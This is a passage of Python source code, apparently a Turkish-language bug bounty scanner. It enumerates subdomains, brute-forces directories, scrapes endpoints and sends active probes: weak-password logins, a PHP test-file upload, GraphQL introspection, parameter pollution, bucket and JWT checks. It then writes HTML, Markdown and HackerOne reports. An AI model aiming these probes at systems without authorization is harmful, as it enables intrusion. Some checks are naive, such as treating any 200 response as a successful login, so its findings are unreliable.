                            cvss = CVSS3('CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N')
                            findings.append(Vulnerability(
                                "OAuth Misconfiguration", test_url, "High",
                                "OAuth yönlendirme açığı tespit edildi",
                                f"Location: {response.headers.get('location')}",
                                cvss.get_score(), cvss.vector, param
                            ))
                        await asyncio.sleep(self.rate_limit_delay)
                    except Exception as e:
                        logging.info(f"OAuth testi hatası ({test_url}): {e}")

            # Broken Authentication
            weak_password = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
            try:
                response = await client.post(url, data={'username': 'test', 'password': weak_password})
                if "login successful" in response.text.lower() or response.status_code == 200:
                    cvss = CVSS3('CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N')
                    findings.append(Vulnerability(
                        "Broken Authentication", url, "High",
                        "Zayıf parola ile oturum açma tespit edildi",
                        f"Password: {weak_password}, Response: {response.text[:100]}",
                        cvss.get_score(), cvss.vector
                    ))
                await asyncio.sleep(self.rate_limit_delay)
            except Exception as e:
                logging.info(f"Broken Auth testi hatası ({url}): {e}")

            # GraphQL Introspection
            try:
                graphql_query = {"query": "{__schema{types{name}}}"}
                response = await client.post(url, json=graphql_query)
                if "__schema" in response.text:
                    cvss = CVSS3('CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N')
                    findings.append(Vulnerability(
                        "GraphQL Introspection", url, "High",
                        "GraphQL introspeksiyon açığı tespit edildi",
                        f"Response: {response.text[:100]}",
                        cvss.get_score(), cvss.vector
                    ))
                await asyncio.sleep(self.rate_limit_delay)
            except Exception as e:
                logging.info(f"GraphQL testi hatası ({url}): {e}")

            # WebSocket Güvenlik Testi
            try:
                async with aiohttp.ClientSession() as session:
                    ws_url = url.replace("https", "wss").replace("http", "ws")
                    async with session.ws_connect(ws_url, timeout=5) as ws:
                        await ws.send_str("test")
                        msg = await ws.receive()
                        if msg.type == aiohttp.WSMsgType.TEXT and "test" in msg.data:
                            cvss = CVSS3('CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N')
                            findings.append(Vulnerability(
                                "WebSocket Misconfiguration", ws_url, "Medium",
                                "WebSocket yankı açığı tespit edildi",
                                f"Response: {msg.data[:100]}",
                                cvss.get_score(), cvss.vector
                            ))
                await asyncio.sleep(self.rate_limit_delay)
            except Exception as e:
                logging.info(f"WebSocket testi hatası ({url}): {e}")

            # HTTP Parameter Pollution
            for param in params:
                for payload in HPP_PAYLOADS:
                    test_url = url.replace(f"{param}={params[param][0]}", f"{param}={quote(payload)}")
                    try:
                        response = await client.get(test_url)
                        if response.status_code == 200 and "value2" in response.text:
                            cvss = CVSS3('CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N')
                            findings.append(Vulnerability(
                                "HTTP Parameter Pollution", test_url, "Medium",
                                "HTTP parametre kirliliği açığı tespit edildi",
                                f"Payload: {payload}, Response: {response.text[:100]}",
                                cvss.get_score(), cvss.vector, param
                            ))
                        await asyncio.sleep(self.rate_limit_delay)
                    except Exception as e:
                        logging.info(f"HPP testi hatası ({test_url}): {e}")

            # Clickjacking
            try:
                response = await client.get(url)
                if 'X-Frame-Options' not in response.headers and 'frame-ancestors' not in response.headers.get('Content-Security-Policy', ''):
                    cvss = CVSS3('CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N')
                    findings.append(Vulnerability(
                        "Clickjacking", url, "Medium",
                        "Clickjacking koruması eksik",
                        f"Headers: {response.headers}",
                        cvss.get_score(), cvss.vector
                    ))
                await asyncio.sleep(self.rate_limit_delay)
            except Exception as e:
                logging.info(f"Clickjacking testi hatası ({url}): {e}")

            # File Upload Zafiyeti
            try:
                files = {'file': ('test.php', '<?php echo "test"; ?>', 'application/x-php')}
                response = await client.post(url, files=files)
                if response.status_code == 200 and "test" in response.text:
                    cvss = CVSS3('CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H')
                    findings.append(Vulnerability(
                        "File Upload Vulnerability", url, "Critical",
                        "Kötü niyetli dosya yükleme açığı tespit edildi",
                        f"Response: {response.text[:100]}",
                        cvss.get_score(), cvss.vector
                    ))
                await asyncio.sleep(self.rate_limit_delay)
            except Exception as e:
                logging.info(f"File Upload testi hatası ({url}): {e}")

            # Misconfigured Cloud Buckets
            for param in params:
                if any(p in param.lower() for p in ['bucket', 's3', 'gcs']):
                    test_url = f"https://{params[param][0]}.s3.amazonaws.com"
                    try:
                        response = await client.get(test_url)
                        if response.status_code == 200 and "<ListBucketResult" in response.text:
                            cvss = CVSS3('CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N')
                            findings.append(Vulnerability(
                                "Misconfigured Cloud Bucket", test_url, "Critical",
                                "Herkese açık S3 bucket tespit edildi",
                                f"Response: {response.text[:100]}",
                                cvss.get_score(), cvss.vector, param
                            ))
                        await asyncio.sleep(self.rate_limit_delay)
                    except Exception as e:
                        logging.info(f"Cloud Bucket testi hatası ({test_url}): {e}")

            # JWT Güvenlik Kontrolü
            try:
                response = await client.get(url)
                for cookie in response.cookies:
                    try:
                        decoded = jwt.decode(cookie.value, options={"verify_signature": False})
                        if decoded.get('alg') == 'none':
                            cvss = CVSS3('CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N')
                            findings.append(Vulnerability(
                                "Insecure JWT", url, "High",
                                "İmzalanmamış JWT token tespit edildi",
                                f"Cookie: {cookie.name}, Payload: {decoded}",
                                cvss.get_score(), cvss.vector
                            ))
                    except jwt.InvalidTokenError:
                        pass
                await asyncio.sleep(self.rate_limit_delay)
            except Exception as e:
                logging.info(f"JWT testi hatası ({url}): {e}")

            # Header Security
            try:
                response = await client.get(url)
                headers = response.headers
                if 'x-xss-protection' not in headers:
                    cvss = CVSS3('CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N')
                    findings.append(Vulnerability(
                        "Missing XSS Protection", url, "Medium",
                        "X-XSS-Protection başlığı eksik",
                        "",
                        cvss.get_score(), cvss.vector
                    ))
                if 'content-security-policy' not in headers:
                    cvss = CVSS3('CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N')
                    findings.append(Vulnerability(
                        "Missing CSP", url, "Medium",
                        "Content-Security-Policy başlığı eksik",
                        "",
                        cvss.get_score(), cvss.vector
                    ))
                if 'strict-transport-security' not in headers:
                    cvss = CVSS3('CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N')
                    findings.append(Vulnerability(
                        "Missing HSTS", url, "Medium",
                        "Strict-Transport-Security başlığı eksik",
                        "",
                        cvss.get_score(), cvss.vector
                    ))
                await asyncio.sleep(self.rate_limit_delay)
            except Exception as e:
                logging.info(f"Başlık kontrol hatası ({url}): {e}")

        # Filtreleme: Kara liste domain kontrolü
        filtered_findings = []
        for finding in findings:
            parsed_url = urlparse(finding.url)
            if not any(re.match(pattern, parsed_url.netloc) for pattern in self.config.get('blacklist_domains', [])):
                filtered_findings.append(finding)
        return filtered_findings

    async def subdomain_enumeration(self, tools: List[str], check_protocols: bool = False,
                                   verify_subdomains: bool = False, timeout: int = 300,
                                   brute_threads: int = 100):
        self.start_time = time.time()
        print(f"{Fore.BLUE}┌───({Fore.CYAN}Subdomain Taraması{Fore.BLUE})──[{Fore.YELLOW}{self.target}{Fore.BLUE}]─{Style.RESET_ALL}")
        try:
            async with asyncio.timeout(timeout):
                subdomains, source_map = await self.subdomain_enumerator.enumerate(
                    tools, 'brute' in tools, brute_threads)
            self.subdomains = list(subdomains)

            if 'httpx-toolkit' in tools:
                httpx_results = await self.subdomain_enumerator.run_httpx_toolkit(self.subdomains)
                for result in httpx_results:
                    if not any(info['subdomain'] == result['subdomain'] for info in self.live_subdomains_info):
                        self.live_subdomains_info.append(result)

            print(f"{Fore.BLUE}├─[*] Subdomainlerin canlılığı kontrol ediliyor ({len(self.subdomains)} subdomain)...{Style.RESET_ALL}")
            tasks = []
            for sub in self.subdomains:
                if self.subdomain_enumerator.is_valid_subdomain(sub):
                    tasks.append(self.check_url(f"https://{sub}", verify_ssl=False, verify_subdomains=True))
            results = await asyncio.gather(*tasks, return_exceptions=True)

            for result in results:
                if result and not isinstance(result, Exception):
                    url, status, headers, tech_stack, redirect_url = result
                    subdomain = url.replace("https://", "").replace("http://", "")
                    if not any(info['subdomain'] == subdomain for info in self.live_subdomains_info):
                        category = self.categorize_subdomain(subdomain)
                        other_protocols = await self.check_other_protocols(subdomain) if check_protocols else []
                        self.live_subdomains_info.append({
                            "subdomain": subdomain,
                            "status": status,
                            "tech": tech_stack,
                            "category": category,
                            "source": source_map.get(subdomain, "httpx"),
                            "redirect_url": redirect_url,
                            "other_protocols": other_protocols
                        })
                        redirect_info = f", Redirect: {self.truncate_url(redirect_url)}" if redirect_url else ""
                        proto_info = f", Protocols: {', '.join(other_protocols)}" if other_protocols else ""
                        print(f"{Fore.GREEN}│ [+] Canlı subdomain: {subdomain} (Status: {status}, Tech: {', '.join(tech_stack)}, Category: {category}, Source: {source_map.get(subdomain, 'httpx')}{redirect_info}{proto_info}){Style.RESET_ALL}")

            if self.live_subdomains_info:
                table_data = []
                for info in self.live_subdomains_info:
                    source_color = {
                        "subfinder": Fore.MAGENTA,
                        "assetfinder": Fore.CYAN,
                        "httpx-toolkit": Fore.YELLOW,
                        "crt.sh": Fore.GREEN,
                        "DNS (A)": Fore.WHITE,
                        "DNS (CNAME)": Fore.WHITE,
                        "SSL Sertifikası": Fore.RED,
                        "httpx": Fore.WHITE,
                        "Wayback Machine": Fore.BLUE
                    }.get(info["source"], Fore.WHITE)
                    table_data.append([
                        info["subdomain"],
                        info["status"],
                        ", ".join(info["tech"]),
                        info["category"],
                        f"{source_color}{info['source']}{Style.RESET_ALL}",
                        self.truncate_url(info["redirect_url"]),
                        ", ".join(info["other_protocols"]) or "-"
                    ])
                print(f"\n{Fore.CYAN}└─=== Canlı Subdomainler ({len(self.live_subdomains_info)}) ==={Style.RESET_ALL}")
                print(tabulate(table_data, headers=["Subdomain", "Status", "Teknoloji", "Kategori", "Kaynak", "Yönlendirme", "Diğer Protokoller"],
                              tablefmt="grid", maxcolwidths=[30, 10, 30, 15, 15, 50, 30]))

            end_time = time.time()
            elapsed = timedelta(seconds=end_time - self.start_time)
            print(f"\n{Fore.BLUE}[*] Tarama özeti: {len(self.live_subdomains_info)} canlı, {len(self.dead_subdomains)} erişilemeyen subdomain bulundu. Süre: {elapsed}{Style.RESET_ALL}")

        except asyncio.TimeoutError:
            print(f"{Fore.RED}└─[-] Tarama zaman aşımına uğradı (süre: {timeout}s).{Style.RESET_ALL}")
            logging.info(f"Tarama zaman aşımına uğradı: {timeout}s")
            self.save_results()
        except Exception as e:
            print(f"{Fore.RED}└─[-] Tarama sırasında hata oluştu: {e}{Style.RESET_ALL}")
            logging.info(f"Tarama sırasında hata: {e}")
            self.save_results()

    def scrape_endpoints(self):
        domains = [self.target] + [info['subdomain'] for info in self.live_subdomains_info]
        print(f"\n{Fore.BLUE}┌───({Fore.CYAN}Endpoint Taraması{Fore.BLUE})──[{Fore.YELLOW}{self.target}{Fore.BLUE}]─{Style.RESET_ALL}")

        # Yeniden deneme mekanizması için requests oturumu
        session = requests.Session()
        retries = Retry(total=self.config.get('max_retries', 3), backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
        session.mount('http://', HTTPAdapter(max_retries=retries))
        session.mount('https://', HTTPAdapter(max_retries=retries))

        for domain in domains:
            target_url = f"https://{domain}"
            try:
                response = session.get(target_url, timeout=self.config.get('http_timeout', 10), verify=False)
                soup = BeautifulSoup(response.text, 'lxml')  # Yalnızca lxml parser
                for link in soup.find_all(['a', 'script', 'link', 'form']):
                    href = link.get('href') or link.get('src') or link.get('action')
                    if href:
                        full_url = urljoin(target_url, href)
                        parsed = urlparse(full_url)
                        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                        if base_url not in self.endpoints:
                            self.endpoints[base_url] = {'urls': [], 'params': {}}
                        self.endpoints[base_url]['urls'].append(full_url)
                        params = self.parse_parameters(full_url)
                        if params:
                            self.endpoints[base_url]['params'].update(params)
                print(f"{Fore.GREEN}├─[+] {domain}: {len(self.endpoints)} endpoint bulundu{Style.RESET_ALL}")
            except requests.exceptions.Timeout as e:
                print(f"{Fore.RED}├─[-] Endpoint tarama hatası ({domain}): Zaman aşımı - {e}{Style.RESET_ALL}")
                logging.info(f"Endpoint tarama hatası ({domain}): {e}")
            except Exception as e:
                print(f"{Fore.RED}├─[-] Endpoint tarama hatası ({domain}): {e}{Style.RESET_ALL}")
                logging.info(f"Endpoint tarama hatası ({domain}): {e}")
        session.close()

        if self.endpoints:
            table_data = []
            for base_url, data in list(self.endpoints.items())[:10]:
                params = ", ".join(data['params'].keys()) if data['params'] else "-"
                table_data.append([self.truncate_url(base_url), params, len(data['urls'])])
            print(f"\n{Fore.CYAN}└─=== İlk 10 Endpoint ==={Style.RESET_ALL}")
            print(tabulate(table_data, headers=["Base URL", "Parametreler", "URL Sayısı"],
                          tablefmt="grid", maxcolwidths=[50, 30, 10]))

    async def directory_brute(self):
        target_url = f"{self.scheme}://{self.target}"
        print(f"\n{Fore.BLUE}┌───({Fore.CYAN}Dizin Taraması{Fore.BLUE})──[{Fore.YELLOW}{self.target}{Fore.BLUE}]─{Style.RESET_ALL}")
        async with aiohttp.ClientSession() as session:
            tasks = []
            for word in self.wordlist:
                url = f"{target_url}/{word}"
                tasks.append(self.check_url(url, verify_ssl=False))
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for result in results:
                if result and not isinstance(result, Exception):
                    url, status, headers, tech_stack, redirect_url = result
                    self.live_urls.append({"url": url, "status": status, "tech": tech_stack, "redirect_url": redirect_url})
                    redirect_info = f", Redirect: {self.truncate_url(redirect_url)}" if redirect_url else ""
                    print(f"{Fore.GREEN}│ [+] Bulundu: {url} (Status: {status}, Tech: {', '.join(tech_stack)}{redirect_info}){Style.RESET_ALL}")

        if self.live_urls:
            table_data = [
                [info["url"], info["status"], ", ".join(info["tech"]), self.truncate_url(info["redirect_url"])]
                for info in self.live_urls
            ]
            print(f"\n{Fore.CYAN}└─=== Canlı Dizinler ({len(self.live_urls)}) ==={Style.RESET_ALL}")
            print(tabulate(table_data, headers=["URL", "Status", "Teknoloji", "Yönlendirme"],
                          tablefmt="grid", maxcolwidths=[50, 10, 30, 50]))
        print(f"{Fore.BLUE}└──────────────────────────────────────────────{Style.RESET_ALL}")

    async def perform_security_scans(self):
        print(f"\n{Fore.BLUE}┌───({Fore.CYAN}Güvenlik Taraması{Fore.BLUE})──[{Fore.YELLOW}{self.target}{Fore.BLUE}]─{Style.RESET_ALL}")
        tasks = []
        for base_url, data in self.endpoints.items():
            if data['params']:
                for url in data['urls'][:5]:  # Her base URL için 5 örnek test
                    tasks.append(self.advanced_security_scan(url, data['params']))
        results = await asyncio.gather(*tasks, return_exceptions=True)

        for result in results:
            if result and not isinstance(result, Exception):
                for finding in result:
                    if finding.hash not in [v.hash for v in self.vulnerabilities]:
                        self.vulnerabilities.append(finding)
                        if finding.severity in ["Critical", "High"]:
                            print(f"{Fore.RED}│ [!] {finding.severity} (CVSS: {finding.cvss_score}): {finding.type} - {finding.url}\n"
                                  f"{Fore.YELLOW}│ Açıklama: {finding.description}\n"
                                  f"{Fore.CYAN}│ Kanıt: {finding.evidence}\n"
                                  f"{Fore.MAGENTA}│ Etkilenen Parametre: {finding.affected_param or '-'}\n"
                                  f"{Fore.MAGENTA}│ CVSS Vector: {finding.cvss_vector}{Style.RESET_ALL}")

        # Subdomain Takeover
        for info in self.live_subdomains_info:
            subdomain = info['subdomain']
            try:
                resolver = dns.resolver.Resolver()
                resolver.nameservers = self.subdomain_enumerator.dns_servers
                answers = resolver.resolve(subdomain, 'CNAME')
                for rdata in answers:
                    cname = str(rdata)
                    if any(s in cname for s in ['cloudfront.net', 's3.amazonaws.com', 'azurewebsites.net']):
                        cvss = CVSS3('CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N')
                        vuln = Vulnerability(
                            "Subdomain Takeover", subdomain, "High",
                            "Subdomain devralma riski tespit edildi",
                            f"CNAME: {cname}",
                            cvss.get_score(), cvss.vector
                        )
                        if vuln.hash not in [v.hash for v in self.vulnerabilities]:
                            self.vulnerabilities.append(vuln)
                            print(f"{Fore.RED}│ [!] High (CVSS: {vuln.cvss_score}): Subdomain Takeover - {subdomain}\n"
                                  f"{Fore.YELLOW}│ Açıklama: {vuln.description}\n"
                                  f"{Fore.CYAN}│ Kanıt: {vuln.evidence}\n"
                                  f"{Fore.MAGENTA}│ CVSS Vector: {vuln.cvss_vector}{Style.RESET_ALL}")
            except Exception:
                pass

        if self.vulnerabilities:
            table_data = [[v.type, self.truncate_url(v.url), v.severity, v.cvss_score, v.description[:50] + "...", v.affected_param or "-"] 
                          for v in self.vulnerabilities if v.severity in ["Critical", "High"]]
            if table_data:
                print(f"\n{Fore.CYAN}└─=== Kritik/Yüksek Bulgular ({len(table_data)}) ==={Style.RESET_ALL}")
                print(tabulate(table_data, headers=["Tür", "URL", "Önem Derecesi", "CVSS Skoru", "Açıklama", "Etkilenen Parametre"],
                              tablefmt="grid", maxcolwidths=[20, 50, 15, 10, 50, 20]))

    def generate_hackerone_report(self, vuln: Vulnerability) -> Dict:
        return {
            "title": f"{vuln.type} on {self.target}",
            "description": f"**Severity**: {vuln.severity} (CVSS: {vuln.cvss_score})\n"
                          f"**URL**: {vuln.url}\n"
                          f"**Affected Parameter**: {vuln.affected_param or 'N/A'}\n"
                          f"**Description**: {vuln.description}\n"
                          f"**Evidence**: {vuln.evidence}\n"
                          f"**CVSS Vector**: {vuln.cvss_vector}\n"
                          f"**Timestamp**: {vuln.timestamp}",
            "severity": vuln.severity.lower(),
            "cwe": "CWE-Unknown",
            "vulnerability_type": vuln.type
        }

    def save_results(self, filename: str = "scan_results", html: bool = True,
                    json_out: bool = True, csv_out: bool = True, markdown: bool = True):
        results = {
            "target": self.target,
            "subdomains": self.live_subdomains_info,
            "endpoints": self.endpoints,
            "live_urls": self.live_urls,
            "dead_subdomains": self.dead_subdomains,
            "vulnerabilities": [vars(vuln) for vuln in self.vulnerabilities],
            "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            "config": self.config
        }

        # JSON
        if json_out:
            with open(f"{filename}.json", 'w') as f:
                json.dump(results, f, indent=2)
            print(f"{Fore.GREEN}[+] Sonuçlar {filename}.json dosyasına kaydedildi.{Style.RESET_ALL}")

        # CSV
        if csv_out:
            with open(f"{filename}.csv", 'w', newline='') as f:
                writer = csv.writer(f)
                writer.writerow(["Tür", "URL", "Önem Derecesi", "CVSS Skoru", "CVSS Vector", "Açıklama", "Kanıt", "Etkilenen Parametre", "Zaman"])
                for vuln in self.vulnerabilities:
                    writer.writerow([vuln.type, vuln.url, vuln.severity, vuln.cvss_score, vuln.cvss_vector,
                                   vuln.description, vuln.evidence or "-", vuln.affected_param or "-", vuln.timestamp])
                writer.writerow([])
                writer.writerow(["Subdomain", "Durum", "Teknoloji", "Kategori", "Kaynak", "Yönlendirme", "Diğer Protokoller"])
                for info in self.live_subdomains_info:
                    writer.writerow([
                        info["subdomain"], info["status"], ", ".join(info["tech"]),
                        info["category"], info["source"], info["redirect_url"] or "-",
                        ", ".join(info["other_protocols"]) or "-"
                    ])
                writer.writerow([])
                writer.writerow(["Erişilemeyen Subdomain", "Hata"])
                for dead_sub, error in self.dead_subdomains:
                    writer.writerow([dead_sub, error])
            print(f"{Fore.GREEN}[+] Sonuçlar {filename}.csv dosyasına kaydedildi.{Style.RESET_ALL}")

        # Markdown
        if markdown:
            with open(f"{filename}.md", 'w') as f:
                f.write(f"# Bug Bounty Tarama Raporu: {self.target}\n\n")
                f.write(f"**Hedef**: {self.target}\n")
                f.write(f"**Tarih**: {results['timestamp']}\n\n")
                f.write("## Zafiyetler\n\n")
                f.write("| Tür | URL | Önem Derecesi | CVSS Skoru | Etkilenen Parametre | Açıklama | Kanıt | Zaman |\n")
                f.write("|-----|-----|---------------|------------|---------------------|----------|-------|-------|\n")
                for vuln in self.vulnerabilities:
                    f.write(f"| {vuln.type} | {vuln.url} | {vuln.severity} | {vuln.cvss_score} | {vuln.affected_param or '-'} | "
                           f"{vuln.description[:50]}... | {vuln.evidence or '-'} | {vuln.timestamp} |\n")
                f.write("\n## Canlı Subdomainler\n\n")
                f.write("| Subdomain | Durum | Teknoloji | Kategori | Kaynak |\n")
                f.write("|-----------|-------|-----------|----------|--------|\n")
                for info in self.live_subdomains_info:
                    f.write(f"| {info['subdomain']} | {info['status']} | {', '.join(info['tech'])} | "
                           f"{info['category']} | {info['source']} |\n")
                f.write("\n## Erişilemeyen Subdomainler\n\n")
                f.write("| Subdomain | Hata |\n")
                f.write("|-----------|------|\n")
                for dead_sub, error in self.dead_subdomains:
                    f.write(f"| {dead_sub} | {error} |\n")
            print(f"{Fore.GREEN}[+] Sonuçlar {filename}.md dosyasına kaydedildi.{Style.RESET_ALL}")

        # HTML
        if html:
            vuln_stats = {
                "Critical": sum(1 for v in self.vulnerabilities if v.severity == "Critical"),
                "High": sum(1 for v in self.vulnerabilities if v.severity == "High"),
                "Medium": sum(1 for v in self.vulnerabilities if v.severity == "Medium"),
                "Low": sum(1 for v in self.vulnerabilities if v.severity == "Low")
            }
            html_content = f"""
            <html>
            <head>
                <title>Bug Bounty Tarama Raporu: {self.target}</title>
                <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
                <style>
                    body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
                            margin: 40px; background: #121212; color: #e0e0e0; line-height: 1.6; }}
                    h1 {{ color: #bb86fc; border-bottom: 2px solid #bb86fc; padding-bottom: 10px; }}
                    h2 {{ color: #03dac6; margin-top: 30px; }}
                    table {{ width: 100%; border-collapse: collapse; margin: 20px 0; background: #1e1e1e; 
                            box-shadow: 0 2px 8px rgba(0,0,0,0.2); }}
                    th, td {{ padding: 12px; border: 1px solid #333; text-align: left; }}
                    th {{ background: #2c2c2c; color: #bb86fc; }}
                    tr:nth-child(even) {{ background: #242424; }}
                    .severity-critical {{ color: #cf6679; font-weight: bold; }}
                    .severity-high {{ color: #ff5555; font-weight: bold; }}
                    .severity-medium {{ color: #ffaa00; }}
                    .severity-low {{ color: #03dac6; }}
                    .vuln-row:hover {{ background: #333; }}
                    .stats {{ background: #1e1e1e; padding: 20px; border-radius: 8px; margin-bottom: 20px; }}
                    .stats span {{ margin-right: 20px; }}
                    canvas {{ max-width: 400px; margin: 20px 0; }}
                </style>
            </head>
            <body>
                <h1>Bug Bounty Tarama Raporu: {self.target}</h1>
                <p><strong>Hedef:</strong> {self.target}</p>
                <p><strong>Tarih:</strong> {results['timestamp']}</p>
                <div class="stats">
                    <h2>İstatistikler</h2>
                    <p>
                        <span>Kritik: {vuln_stats['Critical']}</span>
                        <span>Yüksek: {vuln_stats['High']}</span>
                        <span>Orta: {vuln_stats['Medium']}</span>
                        <span>Düşük: {vuln_stats['Low']}</span>
                    </p>
                    <canvas id="vulnChart"></canvas>
                    <script>
                        const ctx = document.getElementById('vulnChart').getContext('2d');
                        new Chart(ctx, {{
                            type: 'pie',
                            data: {{
                                labels: ['Kritik', 'Yüksek', 'Orta', 'Düşük'],
                                datasets: [{{
                                    data: [{vuln_stats['Critical']}, {vuln_stats['High']}, {vuln_stats['Medium']}, {vuln_stats['Low']}],
                                    backgroundColor: ['#cf6679', '#ff5555', '#ffaa00', '#03dac6']
                                }}]
                            }},
                            options: {{ responsive: true }}
                        }});
                    </script>
                </div>
                <h2>Zafiyetler</h2>
                <table>
                    <tr><th>Tür</th><th>URL</th><th>Önem Derecesi</th><th>CVSS Skoru</th><th>CVSS Vector</th><th>Etkilenen Parametre</th><th>Açıklama</th><th>Kanıt</th><th>Zaman</th></tr>
                    {"".join(f"<tr class='vuln-row'><td>{vuln.type}</td><td>{vuln.url}</td>"
                            f"<td class='severity-{vuln.severity.lower()}'>{vuln.severity}</td>"
                            f"<td>{vuln.cvss_score}</td><td>{vuln.cvss_vector}</td><td>{vuln.affected_param or '-'}</td>"
                            f"<td>{vuln.description}</td><td>{vuln.evidence or '-'}</td><td>{vuln.timestamp}</td></tr>"
                            for vuln in self.vulnerabilities)}
                </table>
                <h2>Canlı Subdomainler</h2>
                <table>
                    <tr><th>Subdomain</th><th>Durum</th><th>Teknoloji</th><th>Kategori</th><th>Kaynak</th><th>Yönlendirme</th><th>Diğer Protokoller</th></tr>
                    {"".join(f"<tr><td>{info['subdomain']}</td><td>{info['status']}</td>"
                            f"<td>{', '.join(info['tech'])}</td><td>{info['category']}</td>"
                            f"<td>{info['source']}</td><td>{info['redirect_url'] or '-'}</td>"
                            f"<td>{', '.join(info['other_protocols']) or '-'}</td></tr>"
                            for info in self.live_subdomains_info)}
                </table>
                <h2>Erişilemeyen Subdomainler</h2>
                <table>
                    <tr><th>Subdomain</th><th>Hata</th></tr>
                    {"".join(f"<tr><td>{dead_sub}</td><td>{error}</td></tr>" 
                            for dead_sub, error in self.dead_subdomains)}
                </table>
                <h2>Endpointler</h2>
                <table>
                    <tr><th>Base URL</th><th>Parametreler</th><th>URL Sayısı</th></tr>
                    {"".join(f"<tr><td>{base_url}</td><td>{', '.join(data['params'].keys()) if data['params'] else '-'}</td>"
                            f"<td>{len(data['urls'])}</td></tr>" for base_url, data in self.endpoints.items())}
                </table>
            </body>
            </html>
            """
            with open(f"{filename}.html", 'w') as f:
                f.write(html_content)
            print(f"{Fore.GREEN}[+] Sonuçlar {filename}.html dosyasına kaydedildi.{Style.RESET_ALL}")

        # HackerOne Raporları
        hackerone_reports = [self.generate_hackerone_report(vuln) for vuln in self.vulnerabilities
                            if vuln.severity in ["Critical", "High"]]
        if hackerone_reports:
            with open(f"{filename}_hackerone.json", 'w') as f:
                json.dump(hackerone_reports, f, indent=2)
            print(f"{Fore.GREEN}[+] HackerOne raporları {filename}_hackerone.json dosyasına kaydedildi.{Style.RESET_ALL}")

    def analyze_results(self):
        print(f"\n{Fore.CYAN}┌───({Fore.CYAN}Analiz ve Öneriler{Fore.BLUE})──[{Fore.YELLOW}{self.target}{Fore.BLUE}]─{Style.RESET_ALL}")
        vuln_counts = {
            "Critical": 0, "High": 0, "Medium": 0, "Low": 0
        }
        tech_counts = {}
        category_counts = {}
        vuln_subdomains = []

        for vuln in self.vulnerabilities:
            vuln_counts[vuln.severity] += 1

        for info in self.live_subdomains_info:
            tech = ", ".join(info["tech"])
            tech_counts[tech] = tech_counts.get(tech, 0) + 1
            category = info["category"]
            category_counts[category] = category_counts.get(category, 0) + 1
            if info["status"] in [401, 403]:
                vuln_subdomains.append(info["subdomain"])

        print(f"{Fore.BLUE}[*] Zafiyet Özeti:{Style.RESET_ALL}")
        for severity, count in vuln_counts.items():
            print(f"- {severity}: {count}")

        print(f"\n{Fore.BLUE}[*] Teknoloji ve Kategori Özeti:{Style.RESET_ALL}")
        for tech, count in tech_counts.items():
            print(f"- Teknoloji: {tech} ({count} subdomain)")
        for category, count in category_counts.items():
            print(f"- Kategori: {category} ({count} subdomain)")

        if vuln_subdomains:
            print(f"\n{Fore.RED}[!] Potansiyel Güvenlik Açıkları:{Style.RESET_ALL}")
            for sub in vuln_subdomains:
                print(f"- {sub} (401/403 bulundu, erişim kontrolü gerekebilir)")

        print(f"\n{Fore.BLUE}[*] Öneriler:{Style.RESET_ALL}")
        print("- Kritik ve Yüksek önem dereceli zafiyetler için acil yama uygulayın.")
        print("- 401/403 durum koduna sahip subdomainleri manuel olarak inceleyin; yetkisiz erişim açıkları olabilir.")
        print("- Açık protokolleri (SMTP, FTP, vb.) kapatın veya erişimi kısıtlayın.")
        print("- Subdomain takeover riskine karşı CNAME kayıtlarını düzenli olarak kontrol edin.")
        print("- API uç noktalarını (özellikle GraphQL ve REST) ek güvenlik testlerine tabi tutun.")
        print("- Zayıf parola politikalarını ve oturum yönetimini gözden geçirin.")
        print("- Herkese açık bulut depolama alanlarını (S3, GCS) kontrol edin.")
        print(f"{Fore.BLUE}└──────────────────────────────────────────────{Style.RESET_ALL}")

async def main():
    print(f"{Fore.YELLOW}[*] Gerekli kütüphaneleri kurun:{Style.RESET_ALL}")
    print("  sudo pip install dnspython aiohttp httpx requests beautifulsoup4 tabulate colorama pyyaml pyjwt cvss lxml")

    def signal_handler(sig, frame):
        print(f"{Fore.RED}└─[-] Tarama kullanıcı tarafından kesildi. Sonuçlar kaydediliyor...{Style.RESET_ALL}")
        logging.info("Tarama kullanıcı tarafından kesildi")
        scanner.save_results()
        scanner.analyze_results()
        sys.exit(1)

    signal.signal(signal.SIGINT, signal_handler)

    parser = argparse.ArgumentParser(description="Profesyonel Bug Bounty Tarama Aracı")
    parser.add_argument("target", help="Hedef domain (ör. example.com veya https://example.com)")
    parser.add_argument("--config", default=DEFAULT_CONFIG, help="Yapılandırma dosyası (varsayılan: config.yaml)")
    parser.add_argument("--timeout", type=int, default=1200, help="Tarama süresi (saniye)")
    parser.add_argument("--brute-threads", type=int, default=300, help="DNS brute force için paralel sorgu sayısı")
    parser.add_argument("--dns-servers", help="Özel DNS sunucuları (örn. 8.8.8.8,1.1.1.1)")
    args = parser.parse_args()

    config = BugBountyScanner.load_config(args.config)
    scanner = BugBountyScanner(args.target, dns_servers=args.dns_servers, config=config)

    config_settings = {
        'tools': ['brute', 'crt.sh', 'ssl', 'txt', 'zone', 'wayback', 'subfinder', 'assetfinder', 'httpx-toolkit'],
        'timeout': args.timeout,
        'brute_threads': args.brute_threads,
    }

